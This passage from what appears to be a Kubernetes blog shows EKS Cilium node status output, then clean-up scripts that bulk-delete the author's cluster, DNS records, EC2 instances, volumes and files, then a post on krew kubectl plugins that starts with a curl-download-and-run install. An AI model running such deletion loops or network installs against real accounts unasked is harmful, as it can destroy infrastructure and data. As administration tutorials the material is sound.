k8s.io/cloud-provider-aws=4484beb1485b6869a3e7e4b77bb31f1f kubernetes.io/arch=arm64 kubernetes.io/hostname=ip-192-168-19-152.ec2.internal kubernetes.io/os=linux node.kubernetes.io/instance-type=t4g.medium topology.ebs.csi.aws.com/zone=us-east-1a topology.kubernetes.io/region=us-east-1 topology.kubernetes.io/zone=us-east-1a vpc.amazonaws.com/has-trunk-attached=false Annotations: network.cilium.io/wg-pub-key: lxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx= API Version: cilium.io/v2 Kind: CiliumNode Metadata: Creation Timestamp: 2023-08-18T17:03:10Z Generation: 6 Owner References: API Version: v1 Kind: Node Name: ip-192-168-19-152.ec2.internal UID: b956ae10-e866-4167-9ff1-7d6c889fed44 Resource Version: 7677 UID: 36fbc130-b9e7-46a8-a62b-b723c6dbb5a3 Spec: Addresses: Ip: 192.168.19.152 Type: InternalIP Ip: 54.147.78.10 Type: ExternalIP Ip: 192.168.13.220 Type: CiliumInternalIP Alibaba - Cloud: Azure: Encryption: Eni: Availability - Zone: us-east-1a Disable - Prefix - Delegation: false First - Interface - Index: 0 Instance - Type: t4g.medium Node - Subnet - Id: subnet-0ac4e4f9d12641825 Use - Primary - Address: false Vpc - Id: vpc-0aaac805cdcd49be5 Health: ipv4: 192.168.0.71 Ingress: Instance - Id: i-042bf8f0cee76e7f0 Ipam: Pod CID Rs: 10.152.0.0/16 Pool: 192.168.0.64: Resource: eni-01d99349e4f322bf6 192.168.0.65: Resource: eni-01d99349e4f322bf6 192.168.0.66: Resource: eni-01d99349e4f322bf6 192.168.0.67: Resource: eni-01d99349e4f322bf6 192.168.0.68: Resource: eni-01d99349e4f322bf6 192.168.0.69: Resource: eni-01d99349e4f322bf6 192.168.0.70: Resource: eni-01d99349e4f322bf6 192.168.0.71: Resource: eni-01d99349e4f322bf6 192.168.0.72: Resource: eni-01d99349e4f322bf6 192.168.0.73: Resource: eni-01d99349e4f322bf6 192.168.0.74: Resource: eni-01d99349e4f322bf6 192.168.0.75: Resource: eni-01d99349e4f322bf6 192.168.0.76: Resource: eni-01d99349e4f322bf6 192.168.0.77: Resource: eni-01d99349e4f322bf6 192.168.0.78: Resource: eni-01d99349e4f322bf6 192.168.0.79: Resource: eni-01d99349e4f322bf6 192.168.13.208: Resource: eni-01d99349e4f322bf6 192.168.13.209: Resource: eni-01d99349e4f322bf6 192.168.13.210: Resource: eni-01d99349e4f322bf6 192.168.13.211: Resource: eni-01d99349e4f322bf6 192.168.13.212: Resource: eni-01d99349e4f322bf6 192.168.13.213: Resource: eni-01d99349e4f322bf6 192.168.13.214: Resource: eni-01d99349e4f322bf6 192.168.13.215: Resource: eni-01d99349e4f322bf6 192.168.13.216: Resource: eni-01d99349e4f322bf6 192.168.13.217: Resource: eni-01d99349e4f322bf6 192.168.13.218: Resource: eni-01d99349e4f322bf6 192.168.13.219: Resource: eni-01d99349e4f322bf6 192.168.13.220: Resource: eni-01d99349e4f322bf6 192.168.13.221: Resource: eni-01d99349e4f322bf6 192.168.13.222: Resource: eni-01d99349e4f322bf6 192.168.13.223: Resource: eni-01d99349e4f322bf6 Pools: Pre - Allocate: 8 Status: Alibaba - Cloud: Azure: Eni: Enis: eni-01d99349e4f322bf6: Addresses: 192.168.13.208 192.168.13.209 192.168.13.210 192.168.13.211 192.168.13.212 192.168.13.213 192.168.13.214 192.168.13.215 192.168.13.216 192.168.13.217 192.168.13.218 192.168.13.219 192.168.13.220 192.168.13.221 192.168.13.222 192.168.13.223 192.168.0.64 192.168.0.65 192.168.0.66 192.168.0.67 192.168.0.68 192.168.0.69 192.168.0.70 192.168.0.71 192.168.0.72 192.168.0.73 192.168.0.74 192.168.0.75 192.168.0.76 192.168.0.77 192.168.0.78 192.168.0.79 Id: eni-01d99349e4f322bf6 Ip: 192.168.19.152 Mac: 12:6d:a9:a9:74:f1 Prefixes: 192.168.13.208/28 192.168.0.64/28 Security - Groups: sg-0e72cf267ee2c8aa2 Subnet: Cidr: 192.168.0.0/19 Id: subnet-0ac4e4f9d12641825 Tags: cluster.k8s.amazonaws.com/name: k01 node.k8s.amazonaws.com/instance_id: i-042bf8f0cee76e7f0 Vpc: Id: vpc-0aaac805cdcd49be5 Primary - Cidr: 192.168.0.0/16 Ipam: Operator - Status: Used: 192.168.0.69: Owner: oauth2-proxy/oauth2-proxy-7d5fd7948f-qvnhr Resource: eni-01d99349e4f322bf6 192.168.0.71: Owner: health Resource: eni-01d99349e4f322bf6 192.168.0.73: Owner: kube-prometheus-stack/kube-prometheus-stack-grafana-54dbcd857d-2hh4x [restored] Resource: eni-01d99349e4f322bf6 192.168.0.75: Owner: cilium/hubble-relay-d44b99d7b-tllkk Resource: eni-01d99349e4f322bf6 192.168.0.76: Owner: cilium/hubble-ui-869b75b895-cjs2w Resource: eni-01d99349e4f322bf6 192.168.0.77: Owner: external-dns/external-dns-7fdb8769ff-srj48 Resource: eni-01d99349e4f322bf6 192.168.13.211: Owner: kube-prometheus-stack/kube-prometheus-stack-kube-state-metrics-78c9594f8f-22lgc [restored] Resource: eni-01d99349e4f322bf6 192.168.13.213: Owner: aws-ebs-csi-driver/ebs-csi-node-svjd8 [restored] Resource: eni-01d99349e4f322bf6 192.168.13.215: Owner: kube-system/coredns-7975d6fb9b-jzqv7 [restored] Resource: eni-01d99349e4f322bf6 192.168.13.217: Owner: kube-system/coredns-7975d6fb9b-c5rfb [restored] Resource: eni-01d99349e4f322bf6 192.168.13.220: Owner: router Resource: eni-01d99349e4f322bf6 192.168.13.222: Owner: aws-ebs-csi-driver/ebs-csi-controller-7847774b66-b4lsl [restored] Resource: eni-01d99349e4f322bf6 192.168.13.223: Owner: forecastle/forecastle-58d7ccb8f8-vw5ct Resource: eni-01d99349e4f322bf6 Events: &lt;none&gt; Name: ip-192-168-3-237.ec2.internal Namespace: Labels: alpha.eksctl.io/cluster-name=k01 alpha.eksctl.io/nodegroup-name=mng01-ng beta.kubernetes.io/arch=arm64 beta.kubernetes.io/instance-type=t4g.medium beta.kubernetes.io/os=linux eks.amazonaws.com/capacityType=ON_DEMAND eks.amazonaws.com/nodegroup=mng01-ng eks.amazonaws.com/nodegroup-image=ami-05d67a5609bec1651 eks.amazonaws.com/sourceLaunchTemplateId=lt-077e09aaa2d4af922 eks.amazonaws.com/sourceLaunchTemplateVersion=1 failure-domain.beta.kubernetes.io/region=us-east-1 failure-domain.beta.kubernetes.io/zone=us-east-1a k8s.io/cloud-provider-aws=4484beb1485b6869a3e7e4b77bb31f1f kubernetes.io/arch=arm64 kubernetes.io/hostname=ip-192-168-3-237.ec2.internal kubernetes.io/os=linux node.kubernetes.io/instance-type=t4g.medium topology.ebs.csi.aws.com/zone=us-east-1a topology.kubernetes.io/region=us-east-1 topology.kubernetes.io/zone=us-east-1a vpc.amazonaws.com/has-trunk-attached=false Annotations: network.cilium.io/wg-pub-key: AxE7xXNN/Izr5ajkE48eSWtOH2WeQBTwhjS3Rma1tDo= API Version: cilium.io/v2 Kind: CiliumNode Metadata: Creation Timestamp: 2023-08-18T17:03:11Z Generation: 6 Owner References: API Version: v1 Kind: Node Name: ip-192-168-3-237.ec2.internal UID: d088d0dd-e531-4652-9a2b-fe6f80516f00 Resource Version: 6220 UID: 2e961861-ea2b-412b-820f-962a9db28b60 Spec: Addresses: Ip: 192.168.3.237 Type: InternalIP Ip: 18.208.178.29 Type: ExternalIP Ip: 192.168.8.67 Type: CiliumInternalIP Alibaba - Cloud: Azure: Encryption: Eni: Availability - Zone: us-east-1a Disable - Prefix - Delegation: false First - Interface - Index: 0 Instance - Type: t4g.medium Node - Subnet - Id: subnet-0ac4e4f9d12641825 Use - Primary - Address: false Vpc - Id: vpc-0aaac805cdcd49be5 Health: ipv4: 192.168.8.66 Ingress: Instance - Id: i-086acad17bd2d676b Ipam: Pod CID Rs: 10.237.0.0/16 Pool: 192.168.30.32: Resource: eni-0f47ee6b88bd0143b 192.168.30.33: Resource: eni-0f47ee6b88bd0143b 192.168.30.34: Resource: eni-0f47ee6b88bd0143b 192.168.30.35: Resource: eni-0f47ee6b88bd0143b 192.168.30.36: Resource: eni-0f47ee6b88bd0143b 192.168.30.37: Resource: eni-0f47ee6b88bd0143b 192.168.30.38: Resource: eni-0f47ee6b88bd0143b 192.168.30.39: Resource: eni-0f47ee6b88bd0143b 192.168.30.40: Resource: eni-0f47ee6b88bd0143b 192.168.30.41: Resource: eni-0f47ee6b88bd0143b 192.168.30.42: Resource: eni-0f47ee6b88bd0143b 192.168.30.43: Resource: eni-0f47ee6b88bd0143b 192.168.30.44: Resource: eni-0f47ee6b88bd0143b 192.168.30.45: Resource: eni-0f47ee6b88bd0143b 192.168.30.46: Resource: eni-0f47ee6b88bd0143b 192.168.30.47: Resource: eni-0f47ee6b88bd0143b 192.168.8.64: Resource: eni-0f47ee6b88bd0143b 192.168.8.65: Resource: eni-0f47ee6b88bd0143b 192.168.8.66: Resource: eni-0f47ee6b88bd0143b 192.168.8.67: Resource: eni-0f47ee6b88bd0143b 192.168.8.68: Resource: eni-0f47ee6b88bd0143b 192.168.8.69: Resource: eni-0f47ee6b88bd0143b 192.168.8.70: Resource: eni-0f47ee6b88bd0143b 192.168.8.71: Resource: eni-0f47ee6b88bd0143b 192.168.8.72: Resource: eni-0f47ee6b88bd0143b 192.168.8.73: Resource: eni-0f47ee6b88bd0143b 192.168.8.74: Resource: eni-0f47ee6b88bd0143b 192.168.8.75: Resource: eni-0f47ee6b88bd0143b 192.168.8.76: Resource: eni-0f47ee6b88bd0143b 192.168.8.77: Resource: eni-0f47ee6b88bd0143b 192.168.8.78: Resource: eni-0f47ee6b88bd0143b 192.168.8.79: Resource: eni-0f47ee6b88bd0143b Pools: Pre - Allocate: 8 Status: Alibaba - Cloud: Azure: Eni: Enis: eni-0f47ee6b88bd0143b: Addresses: 192.168.8.64 192.168.8.65 192.168.8.66 192.168.8.67 192.168.8.68 192.168.8.69 192.168.8.70 192.168.8.71 192.168.8.72 192.168.8.73 192.168.8.74 192.168.8.75 192.168.8.76 192.168.8.77 192.168.8.78 192.168.8.79 192.168.30.32 192.168.30.33 192.168.30.34 192.168.30.35 192.168.30.36 192.168.30.37 192.168.30.38 192.168.30.39 192.168.30.40 192.168.30.41 192.168.30.42 192.168.30.43 192.168.30.44 192.168.30.45 192.168.30.46 192.168.30.47 Id: eni-0f47ee6b88bd0143b Ip: 192.168.3.237 Mac: 12:e1:d7:9d:e6:59 Prefixes: 192.168.8.64/28 192.168.30.32/28 Security - Groups: sg-0e72cf267ee2c8aa2 Subnet: Cidr: 192.168.0.0/19 Id: subnet-0ac4e4f9d12641825 Tags: cluster.k8s.amazonaws.com/name: k01 node.k8s.amazonaws.com/instance_id: i-086acad17bd2d676b Vpc: Id: vpc-0aaac805cdcd49be5 Primary - Cidr: 192.168.0.0/16 Ipam: Operator - Status: Used: 192.168.8.64: Owner: aws-ebs-csi-driver/ebs-csi-controller-7847774b66-nrlf4 [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.66: Owner: health Resource: eni-0f47ee6b88bd0143b 192.168.8.67: Owner: router Resource: eni-0f47ee6b88bd0143b 192.168.8.68: Owner: snapshot-controller/snapshot-controller-8658dd5c86-z2z6q [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.69: Owner: cert-manager/cert-manager-859997c796-j9hh8 Resource: eni-0f47ee6b88bd0143b 192.168.8.70: Owner: cert-manager/cert-manager-cainjector-7bb8cb69c5-2q6fk Resource: eni-0f47ee6b88bd0143b 192.168.8.72: Owner: mailhog/mailhog-6f54fccf85-pdb9k [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.73: Owner: aws-ebs-csi-driver/ebs-csi-node-n8vrn [restored] Resource: eni-0f47ee6b88bd0143b 192.168.8.78: Owner: kube-prometheus-stack/alertmanager-kube-prometheus-stack-alertmanager-0 [restored] Resource: eni-0f47ee6b88bd0143b Events: &lt;none&gt; This command helps find exposed ports (HostNetwork) to check for port collisions: kubectl get endpoints -A -o json | jq '.items[] | (.metadata.name , .subsets[].addresses[].ip, .subsets[].addresses[].nodeName, .subsets[].addresses[].targetRef.name, .subsets[].ports[])' kubectl get pods -A -o json | jq \".items[] | select (.spec.hostNetwork==true) .spec.containers[].name, .metadata.name, .spec.containers[].ports[0]\" Clean-up Remove the EKS cluster and its created components: if eksctl get cluster --name=\"${CLUSTER_NAME}\"; then eksctl delete cluster --name=\"${CLUSTER_NAME}\" --force fi Remove the Route 53 DNS records from the DNS Zone: CLUSTER_FQDN_ZONE_ID=$(aws route53 list-hosted-zones --query \"HostedZones[?Name==\\`${CLUSTER_FQDN}.\\`].Id\" --output text) if [[ -n \"${CLUSTER_FQDN_ZONE_ID}\" ]]; then aws route53 list-resource-record-sets --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" | jq -c '.ResourceRecordSets[] | select (.Type != \"SOA\" and .Type != \"NS\")' | while read -r RESOURCERECORDSET; do aws route53 change-resource-record-sets \\ --hosted-zone-id \"${CLUSTER_FQDN_ZONE_ID}\" \\ --change-batch '{\"Changes\":[{\"Action\":\"DELETE\",\"ResourceRecordSet\": '\"${RESOURCERECORDSET}\"' }]}' \\ --output text --query 'ChangeInfo.Id' done fi Remove any orphan EC2 instances created by Karpenter: for EC2 in $(aws ec2 describe-instances --filters \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" Name=instance-state-name,Values=running --query \"Reservations[].Instances[].InstanceId\" --output text); do echo \"Removing EC2: ${EC2}\" aws ec2 terminate-instances --instance-ids \"${EC2}\" done Remove the CloudWatch log group: if [[ \"$(aws logs describe-log-groups --query \"logGroups[?logGroupName==\\`/aws/eks/${CLUSTER_NAME}/cluster\\`] | [0].logGroupName\" --output text)\" = \"/aws/eks/${CLUSTER_NAME}/cluster\" ]]; then aws logs delete-log-group --log-group-name \"/aws/eks/${CLUSTER_NAME}/cluster\" fi Remove the CloudFormation stack: aws cloudformation delete-stack --stack-name \"${CLUSTER_NAME}-route53-kms\" Wait for all CloudFormation stacks to complete deletion: aws cloudformation wait stack-delete-complete --stack-name \"${CLUSTER_NAME}-route53-kms\" aws cloudformation wait stack-delete-complete --stack-name \"eksctl-${CLUSTER_NAME}-cluster\" Remove Volumes and Snapshots related to the cluster (as a precaution): for VOLUME in $(aws ec2 describe-volumes --filter \"Name=tag:KubernetesCluster,Values=${CLUSTER_NAME}\" \"Name=tag:kubernetes.io/cluster/${CLUSTER_NAME},Values=owned\" --query 'Volumes[].VolumeId' --output text); do echo \"*** Removing Volume: ${VOLUME}\" aws ec2 delete-volume --volume-id \"${VOLUME}\" done Remove the ${TMP_DIR}/${CLUSTER_FQDN} directory: if [[ -d \"${TMP_DIR}/${CLUSTER_FQDN}\" ]]; then for FILE in \"${TMP_DIR}/${CLUSTER_FQDN}\"/{kubeconfig-${CLUSTER_NAME}.conf,{aws-cf-route53-kms,eksctl-${CLUSTER_NAME},k8s-karpenter-provisioner,helm_values-{aws-ebs-csi-driver,aws-for-fluent-bit,cert-manager,cilium,external-dns,forecastle,ingress-nginx,karpenter,kube-prometheus-stack,mailhog,oauth2-proxy},k8s-cert-manager-{certificate,clusterissuer}-staging}.yml}; do if [[ -f \"${FILE}\" ]]; then rm -v \"${FILE}\" else echo \"*** File not found: ${FILE}\" fi done rmdir \"${TMP_DIR}/${CLUSTER_FQDN}\" fi Enjoy ‚Ä¶ üòâ" }, { "title": "My favourite krew plugins for kubectl", "url": "/posts/my-favourite-krew-plugins-kubectl/", "categories": "Kubernetes, krew, kubectl, plugins, plugin-manager", "tags": "kubernetes, krew, kubectl, plugins, plugin-manager", "date": "2023-06-06 00:00:00 +0200", "content": "I would like to share a few notes about the kubectl plugins I use, installed via krew. This is not intended to be a comprehensive description of these plugins; instead, I prefer to focus on examples and screenshots. Links: Suman Chakraborty‚Äôs Post Top 15 Kubectl plugins for security engineers Kubernetes: Krew plugins manager, and useful kubectl plugins list Making Kubernetes Operations Easy with kubectl Plugins Requirements An Amazon EKS cluster (as described in ‚ÄúCheapest Amazon EKS)‚Äù kubectl Install krew Install Krew, the plugin manager for the kubectl command-line tool: TMP_DIR=\"${TMP_DIR:-${PWD}}\" ARCH=\"amd64\" curl -sL \"https://github.com/kubernetes-sigs/krew/releases/download/v0.4.5/krew-linux_${ARCH}.tar.gz\" | tar -xvzf - -C \"${TMP_DIR}\" --no-same-owner --strip-components=1 --wildcards \"*/krew-linux*\" \"${TMP_DIR}/krew-linux_${ARCH}\" install krew rm \"${TMP_DIR}/krew-linux_${ARCH}\" export PATH=\"${HOME}/.krew/bin:${PATH}\" My Favorite krew + kubectl plugins Here is a list of my favorite Krew and kubectl plugins: cert-manager This kubectl add-on automates the management and issuance of TLS certificates. It allows for direct interaction with cert-manager resources, such as performing manual renewal of Certificate resources. Installation of the cert-manager Krew plugin: kubectl krew install cert-manager Get details about the current status of a cert-manager Certificate resource, including information on related resources like CertificateRequest or Order: kubectl cert-manager status certificate --namespace cert-manager ingress-cert-staging Name: ingress-cert-staging Namespace: cert-manager Created at: 2023-06-18T07:31:46Z Conditions: Ready: True, Reason: Ready, Message: Certificate is up to date and has not expired DNS Names: - *.k01.k8s.mylabs.dev - k01.k8s.mylabs.dev Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Issuing 41m cert-manager-certificates-trigger Issuing certificate as Secret does not exist Normal Generated 41m cert-manager-certificates-key-manager Stored new private key in temporary Secret resource \"ingress-cert-staging-jbw7s\" Normal Requested 41m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-staging-r2mnb\" Normal Reused 37m cert-manager-certificates-key-manager Reusing private key stored in existing Secret resource \"ingress-cert-staging\" Normal Requested 37m cert-manager-certificates-request-manager Created new CertificateRequest resource \"ingress-cert-staging-jm8c2\" Normal Issuing 37m (x2 over 38m) cert-manager-certificates-issuing The certificate has been successfully issued Issuer: Name: letsencrypt-staging-dns Kind: ClusterIssuer Conditions: Ready: True, Reason: ACMEAccountRegistered, Message: The ACME account was registered with the ACME server Events: &lt;none&gt; Secret: Name: ingress-cert-staging Issuer Country: US Issuer Organisation: (STAGING) Let's Encrypt Issuer Common Name: (STAGING) Artificial Apricot R3 Key Usage: Digital Signature, Key Encipherment Extended Key Usages: Server Authentication, Client Authentication Public Key Algorithm: RSA Signature Algorithm: SHA256-RSA Subject Key ID: 6ad5d66e8d4e46409107d6af11283ef603f5113b Authority Key ID: de727a48df31c3a650df9f8523df57374b5d2e65 Serial Number: fabb47cea28a80ce5add9eb5e02c5e7c8273 Events: &lt;none&gt; Not Before: 2023-06-18T06:36:23Z Not After: 2023-09-16T06:36:22Z Renewal Time: 2023-08-17T06:36:22Z No CertificateRequest found for this Certificate Mark cert-manager Certificate resources for manual renewal: kubectl cert-manager renew --namespace cert-manager ingress-cert-staging sleep 5 kubectl cert-manager inspect secret --namespace cert-manager ingress-cert-staging | grep -A2 -E 'Validity period' Manually triggered issuance of Certificate cert-manager/ingress-cert-staging Validity period: Not Before: Sun, 18 Jun 2023 07:15:58 UTC Not After: Sat, 16 Sep 2023 07:15:57 UTC The Certificate was created at 2023-06-18 06:36:23 and then rotated on 18 Jun 2023 07:15:58. get-all Similar to kubectl get all, but it retrieves truly all resources. Installation of the get-all Krew plugin: kubectl krew install get-all Get all resources from the default namespace: kubectl get-all -n default NAME NAMESPACE AGE configmap/kube-root-ca.crt default 68m endpoints/kubernetes default 69m serviceaccount/default default 68m service/kubernetes default 69m endpointslice.discovery.k8s.io/kubernetes default 69m ice ice is an open-source tool that helps Kubernetes users monitor and optimize container resource usage. Installation of the ice Krew plugin: kubectl krew install ice List CPU information for containers within pods: kubectl ice cpu -n kube-prometheus-stack --sort used PODNAME CONTAINER USED REQUEST LIMIT %REQ %LIMIT prometheus-kube-prometheus-stack-prometheus-0 config-reloader 0m 200m 200m - - alertmanager-kube-prometheus-stack-alertmanager-0 alertmanager 1m 0m 0m - - alertmanager-kube-prometheus-stack-alertmanager-0 config-reloader 1m 200m 200m 0.01 0.01 kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-dashboard 1m - - - - kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-datasources 1m - - - - kube-prometheus-stack-operator-7f45586f68-9rz6j kube-prometheus-stack 1m - - - - kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb kube-state-metrics 2m - - - - kube-prometheus-stack-prometheus-node-exporter-m4k5m node-exporter 2m - - - - kube-prometheus-stack-prometheus-node-exporter-x5bhm node-exporter 2m - - - - kube-prometheus-stack-grafana-896f8645-6q9lb grafana 8m - - - - prometheus-kube-prometheus-stack-prometheus-0 prometheus 52m - - - - List memory information for containers within pods: kubectl ice memory -n kube-prometheus-stack --node-tree NAMESPACE NAME USED REQUEST LIMIT %REQ %LIMIT kube-prometheus-stack StatefulSet/alertmanager-kube-prometheus-stack-alertmanager 19.62Mi 250.00Mi 50.00Mi 0.04 0.01 kube-prometheus-stack ‚îî‚îÄPod/alertmanager-kube-prometheus-stack-alertmanager-0 19.62Mi 250.00Mi 50.00Mi 0.04 0.01 kube-prometheus-stack ‚îî‚îÄContainer/alertmanager 16.44Mi 200Mi 0 8.22 - kube-prometheus-stack ‚îî‚îÄContainer/config-reloader 3.18Mi 50Mi 50Mi 6.35 6.35 - Node/ip-192-168-26-84.ec2.internal 241.14Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄDeployment/kube-prometheus-stack-grafana 231.98Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄReplicaSet/kube-prometheus-stack-grafana-896f8645 231.98Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄPod/kube-prometheus-stack-grafana-896f8645-6q9lb 231.98Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄContainer/grafana-sc-dashboard 70.99Mi - - - - kube-prometheus-stack ‚îî‚îÄContainer/grafana-sc-datasources 72.67Mi - - - - kube-prometheus-stack ‚îî‚îÄContainer/grafana 88.32Mi - - - - kube-prometheus-stack ‚îî‚îÄDaemonSet/kube-prometheus-stack-prometheus-node-exporter 9.16Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄPod/kube-prometheus-stack-prometheus-node-exporter-m4k5m 9.16Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄContainer/node-exporter 9.16Mi - - - - - Node/ip-192-168-7-23.ec2.internal 44.42Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄDeployment/kube-prometheus-stack-kube-state-metrics 12.68Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄReplicaSet/kube-prometheus-stack-kube-state-metrics-669bd5c594 12.68Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄPod/kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb 12.68Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄContainer/kube-state-metrics 12.68Mi - - - - kube-prometheus-stack ‚îî‚îÄDeployment/kube-prometheus-stack-operator 22.64Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄReplicaSet/kube-prometheus-stack-operator-7f45586f68 22.64Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄPod/kube-prometheus-stack-operator-7f45586f68-9rz6j 22.64Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄContainer/kube-prometheus-stack 22.64Mi - - - - kube-prometheus-stack ‚îî‚îÄDaemonSet/kube-prometheus-stack-prometheus-node-exporter 9.10Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄPod/kube-prometheus-stack-prometheus-node-exporter-x5bhm 9.10Mi 0 0 - - kube-prometheus-stack ‚îî‚îÄContainer/node-exporter 9.11Mi - - - - kube-prometheus-stack StatefulSet/prometheus-kube-prometheus-stack-prometheus 400.28Mi 50.00Mi 50.00Mi 0.80 0.80 kube-prometheus-stack ‚îî‚îÄPod/prometheus-kube-prometheus-stack-prometheus-0 400.28Mi 50.00Mi 50.00Mi 0.80 0.80 kube-prometheus-stack ‚îî‚îÄContainer/prometheus 393.89Mi - - - - kube-prometheus-stack ‚îî‚îÄContainer/config-reloader 6.38Mi 50Mi 50Mi 12.77 12.77 List image information for containers within pods: kubectl ice image -n cert-manager PODNAME CONTAINER PULL IMAGE TAG cert-manager-777fbdc9f8-ng8dg cert-manager-controller IfNotPresent quay.io/jetstack/cert-manager-controller v1.12.2 cert-manager-cainjector-65857fccf8-krpr9 cert-manager-cainjector IfNotPresent quay.io/jetstack/cert-manager-cainjector v1.12.2 cert-manager-webhook-54f9d96756-plv84 cert-manager-webhook IfNotPresent quay.io/jetstack/cert-manager-webhook v1.12.2 List the status of individual containers within pods: kubectl ice status -n kube-prometheus-stack PODNAME CONTAINER READY STARTED RESTARTS STATE REASON EXIT-CODE SIGNAL AGE alertmanager-kube-prometheus-stack-alertmanager-0 init-config-reloader true - 0 Terminated Completed 0 0 100m alertmanager-kube-prometheus-stack-alertmanager-0 alertmanager true true 0 Running - - - 100m alertmanager-kube-prometheus-stack-alertmanager-0 config-reloader true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb download-dashboards true - 0 Terminated Completed 0 0 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-dashboard true true 0 Running - - - 100m kube-prometheus-stack-grafana-896f8645-6q9lb grafana-sc-datasources true true 0 Running - - - 100m kube-prometheus-stack-kube-state-metrics-669bd5c594-vfznb kube-state-metrics true true 0 Running - - - 100m kube-prometheus-stack-operator-7f45586f68-9rz6j kube-prometheus-stack true true 0 Running - - - 100m kube-prometheus-stack-prometheus-node-exporter-m4k5m node-exporter true true 0 Running - - - 100m kube-prometheus-stack-prometheus-node-exporter-x5bhm node-exporter true true 0 Running - - - 100m prometheus-kube-prometheus-stack-prometheus-0 init-config-reloader true - 0 Terminated Completed 0 0 100m prometheus-kube-prometheus-stack-prometheus-0 config-reloader true true 0 Running - - - 100m prometheus-kube-prometheus-stack-prometheus-0 prometheus true true 0 Running - - - 100m ktop A top-like tool for your Kubernetes clusters. Installation of the ktop Krew plugin: kubectl krew install ktop Run ktop: kubectl ktop ktop screenshot kubepug A Kubernetes Pre-Upgrade Checker. KubePug logo Installation of the deprecations Krew plugin: kubectl krew install deprecations Shows all deprecated objects in a Kubernetes cluster, allowing an operator to verify them before upgrading the cluster: kubectl deprecations --k8s-version=v1.27.0 deprecations screenshot deprecations screenshot from official GitHub repository node-ssm This kubectl plugin allows direct connections to AWS EKS cluster nodes managed by Systems Manager, relying on the local AWS CLI and the session-manager-plugin being installed. Installation of the node-ssm Krew plugin: kubectl krew install node-ssm Access a node using SSM: K8S_NODE=$(kubectl get nodes -o custom-columns=NAME:.metadata.name --no-headers | head -n 1) kubectl node-ssm --target \"${K8S_NODE}\" Starting session with SessionId: ruzickap@M-C02DP163ML87-k8s-1687787750-03553ad56b6a28df6 Welcome to Bottlerocket's control container! ‚ï±‚ï≤ ‚ï±‚îÑ‚îÑ‚ï≤ This container gives you access to the Bottlerocket API, ... ... ... [ssm-user@control]$ ns A faster way to switch between namespaces in kubectl. Installation of the ns Krew plugin: kubectl krew install ns Change the active namespace of the current context and list secrets from cert-manager without using the --namespace or -n option: kubectl ns cert-manager kubectl get secrets Context \"arn:aws:eks:us-east-1:729560437327:cluster/k01\" modified. Active namespace is \"cert-manager\". NAME TYPE DATA AGE cert-manager-webhook-ca Opaque 3 107m ingress-cert-staging kubernetes.io/tls 2 102m letsencrypt-staging-dns Opaque 1 106m sh.helm.release.v1.cert-manager.v1 helm.sh/release.v1 1 107m open-svc The kubectl open-svc plugin makes services accessible via their ClusterIP from outside your cluster. Installation of the open-svc Krew plugin: kubectl krew install open-svc Open the Grafana Dashboard URL in the browser: kubectl open-svc kube-prometheus-stack-grafana -n kube-prometheus-stack open-svc screenshot from official GitHub repository pod-lens A kubectl plugin to show pod-related resources. pod-lens logo Installation of the pod-lens Krew plugin: kubectl krew install pod-lens Find related workloads, namespace, node, service, configmap, secret, ingress, PVC, HPA, and PDB by pod name and display them in a tree structure: kubectl pod-lens -n kube-prometheus-stack prometheus-kube-prometheus-stack-prometheus-0 pod-lens showing details in kube-prometheus-stack namespace kubectl pod-lens -n karpenter karpenter- pod-lens showing details in karpenter namespace rbac-tool Installation of the rbac-tool Krew plugin: kubectl krew install rbac-tool Shows which subjects have RBAC get permissions for /apis: kubectl rbac-tool who-can get /apis TYPE | SUBJECT | NAMESPACE +-------+----------------------+-----------+ Group | system:authenticated | Group | system:masters | User | eks:addon-manager | Shows which subjects have RBAC watch permissions for deployments.apps: kubectl rbac-tool who-can watch deployments.apps TYPE | SUBJECT | NAMESPACE +----------------+------------------------------------------+-----------------------+ Group | eks:service-operations | Group | system:masters | ServiceAccount | deployment-controller | kube-system ServiceAccount | disruption-controller | kube-system ServiceAccount | eks-vpc-resource-controller | kube-system ServiceAccount | generic-garbage-collector | kube-system ServiceAccount | karpenter | karpenter ServiceAccount | kube-prometheus-stack-kube-state-metrics | kube-prometheus-stack ServiceAccount | resourcequota-controller | kube-system User | eks:addon-manager | User | eks:vpc-resource-controller | User | system:kube-controller-manager | Get details about the current ‚Äúuser‚Äù: kubectl rbac-tool whoami {Username: \"kubernetes-admin\", UID: \"aws-iam-authenticator:7xxxxxxxxxx7:AxxxxxxxxxxxxxxxxxxxL\", Groups: [\"system:masters\", \"system:authenticated\"], Extra: {accessKeyId: [\"AxxxxxxxxxxxxxxxxxxA\"], arn: [\"arn:aws:sts::7xxxxxxxxxx7:assumed-role/GitHubRole/ruzickap@mymac-k8s-1111111111\"], canonicalArn: [\"arn:aws:iam::7xxxxxxxxxx7:role/GitHubRole\"], principalId: [\"AxxxxxxxxxxxxxxxxxxxL\"], sessionName: 